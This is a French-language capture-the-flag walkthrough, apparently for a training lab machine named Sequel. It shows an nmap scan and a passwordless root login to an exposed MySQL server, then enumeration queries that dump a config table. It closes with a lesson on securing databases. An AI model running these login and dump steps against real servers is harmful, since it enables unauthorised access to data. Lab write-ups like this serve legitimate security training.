[⬅ Retour à Starting Point](../README.md) · [🏠 Accueil du repo](../../../README.md)

# Machine 6 — Sequel

**MySQL root exposé sans mot de passe — Port 3306**

| | |
|---|---|
| **Tier** | 1 |
| **OS** | Linux |
| **Service** | MySQL (3306) |

## Concept

Se connecter directement à un serveur MySQL exposé, sans couche applicative intermédiaire.

## Méthodologie

### Scan de ports

```bash
nmap -sV -sC 10.129.x.x
```

```
3306/tcp open  mysql
```

### Connexion et énumération

```bash
mysql -h 10.129.x.x -u root --ssl=0
```

`--ssl=0` contourne un souci de négociation TLS avec un serveur ancien.

```sql
SHOW DATABASES;
USE <nom_de_la_base>;
SHOW TABLES;
SELECT * FROM config;
```

## Points clés

- Un compte root MySQL exposé sans mot de passe est une faille critique et immédiate.
- `--ssl=0` est parfois nécessaire face à des serveurs anciens mal configurés côté TLS.

## Leçon retenue

*Ne jamais exposer un service de base de données directement sur un réseau non maîtrisé, et toujours exiger un mot de passe fort.*

---

[⬅ Précédent : Appointment](05-appointment.md) · [⬆ Index Starting Point](../README.md) · [Suivant : Oasis ➡](07-oasis.md)
